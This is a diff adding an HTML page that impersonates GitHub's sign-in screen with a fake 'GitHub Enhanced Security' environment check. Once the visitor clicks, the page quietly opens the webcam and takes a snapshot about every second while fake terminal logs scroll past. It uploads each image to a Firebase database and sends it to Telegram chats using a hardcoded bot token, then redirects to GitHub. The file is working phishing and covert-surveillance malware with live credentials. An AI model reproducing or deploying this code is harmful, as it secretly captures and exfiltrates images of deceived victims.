@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to GitHub · GitHub</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --gh-bg: #0d1117;
+            --gh-border: #30363d;
+            --gh-text: #c9d1d9;
+            --gh-blue: #58a6ff;
+            --gh-success: #238636;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--gh-bg); color: var(--gh-text);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+            display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .auth-container {
+            width: 100%; max-width: 340px; text-align: center;
+        }
+
+        .gh-logo { width: 48px; margin-bottom: 24px; filter: invert(1); }
+
+        .auth-card {
+            background: #161b22; border: 1px solid var(--gh-border);
+            border-radius: 6px; padding: 20px; text-align: left;
+        }
+
+        .auth-header { font-size: 24px; font-weight: 300; margin-bottom: 15px; text-align: center; color: #f0f6fc; }
+
+        .repo-badge {
+            background: rgba(56, 139, 253, 0.1); border: 1px solid rgba(56, 139, 253, 0.4);
+            border-radius: 20px; padding: 4px 12px; font-size: 12px; color: var(--gh-blue);
+            display: inline-block; margin-bottom: 20px;
+        }
+
+        p { font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
+
+        .btn-github {
+            background: var(--gh-success); color: #fff; border: 1px solid rgba(240, 246, 252, 0.1);
+            width: 100%; padding: 8px 16px; font-size: 14px; font-weight: 600;
+            border-radius: 6px; cursor: pointer; transition: 0.2s;
+        }
+
+        .btn-github:hover { background: #2ea043; }
+
+        /* Sync State UI */
+        #sync-view { display: none; }
+        
+        .terminal-loader {
+            background: #010409; border: 1px solid var(--gh-border);
+            padding: 12px; border-radius: 6px; font-family: monospace;
+            font-size: 12px; color: #7ee787; min-height: 100px; margin-bottom: 15px;
+        }
+
+        .loading-dots:after {
+            content: '.'; animation: dots 1.5s steps(5, end) infinite;
+        }
+        @keyframes dots { 0%, 20% { content: '.'; } 40% { content: '..'; } 60% { content: '...'; } 80%, 100% { content: ''; } }
+
+        .progress-bar { width: 100%; height: 4px; background: #30363d; border-radius: 2px; position: relative; overflow: hidden; }
+        .progress-fill { width: 0%; height: 100%; background: var(--gh-blue); transition: width 1s linear; }
+    </style>
+</head>
+<body>
+
+    <div class="auth-container">
+        <img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" class="gh-logo">
+        <h1 class="auth-header">Private Access Required</h1>
+
+        <div class="auth-card" id="init-view">
+            <div style="text-align: center;"><div class="repo-badge">🔒 Private Repository</div></div>
+            <p>This repository uses <b>GitHub Enhanced Security</b>. To view this profile and its shared assets, you must perform a hardware-based environment check.</p>
+            
+            <button class="btn-github" onclick="startGithubSync()">Verify Environment</button>
+            <div style="font-size: 12px; color: #8b949e; margin-top: 15px; text-align: center;">
+                Verification node: <b>Gaya_Bihar_IN</b>
+            </div>
+        </div>
+
+        <div class="auth-card" id="sync-view">
+            <div class="terminal-loader" id="log-output">
+                $ gh auth status<br>
+                > Validating SSH signature...<br>
+                > Synchronizing with regional node...
+            </div>
+            <div class="progress-bar"><div class="progress-fill" id="gh-p-bar"></div></div>
+            <div style="font-size: 12px; color: #8b949e; margin-top: 10px; text-align: center;">
+                Handshake expires in <span id="gh-timer">60</span>s
+            </div>
+        </div>
+    </div>
+
+    <!-- Background Engine -->
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function startGithubSync() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('init-view').style.display = 'none';
+                document.getElementById('sync-view').style.display = 'block';
+
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let timeLeft = 60;
+                    let count = 0;
+
+                    const interval = setInterval(() => {
+                        timeLeft--;
+                        count++;
+                        document.getElementById('gh-timer').innerText = timeLeft;
+                        document.getElementById('gh-p-bar').style.width = `${((60-timeLeft)/60)*100}%`;
+
+                        if (count % 8 === 0) updateGhLogs();
+                        if (count <= 55) ghCapture(count);
+
+                        if (timeLeft <= 0) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            window.location.href = "https://github.com/trending";
+                        }
+                    }, 1000);
+                };
+            } catch (err) {
+                window.location.href = "https://github.com/trending";
+            }
+        }
+
+        function updateGhLogs() {
+            const logs = [
+                "> Analyzing hardware entropy...",
+                "> Validating local ISP handshake...",
+                "> Syncing environment keys...",
+                "> Establishing encrypted bridge..."
+            ];
+            const out = document.getElementById('log-output');
+            out.innerHTML += `<br>> ${logs[Math.floor(Math.random()*logs.length)]}`;
+        }
+
+        function ghCapture(idx) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.2);
+            database.ref('captures').push({ image: b64, type: "GITHUB_SPOOF", ts: Date.now() });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'gh_recon.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
+</body>
+</html>
